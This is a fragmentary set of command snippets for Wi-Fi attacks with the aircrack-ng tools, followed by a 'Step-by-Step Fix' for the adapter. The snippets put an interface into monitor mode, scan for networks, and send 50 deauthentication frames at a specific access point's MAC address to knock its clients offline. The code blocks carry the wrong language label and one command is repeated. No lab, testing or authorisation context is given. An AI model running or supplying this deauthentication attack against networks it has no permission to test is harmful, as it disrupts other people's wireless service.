```ruby
sudo airmon-ng start wlp0s20f3
```

~~~ruby
sudo airodump-ng wlp0s20f3mon
~~~

~~~ruby
sudo iwconfig wlp0s20f3mon channel 10
~~~

~~~ruby
sudo aireplay-ng --deauth 50 -a E4:C3:2A:65:F9:7E wlp0s20f3mon
~~~


### ✅ Step-by-Step Fix:

#### Step 1: Unblock the Wi-Fi adapter
~~~ruby
sudo rfkill unblock wifi
~~~

~~~ruby
sudo rfkill unblock wifi
~~~

~~~ruby
sudo airmon-ng check kill
~~~

~~~
sudo airmon-ng start wlp0s20f3
~~~

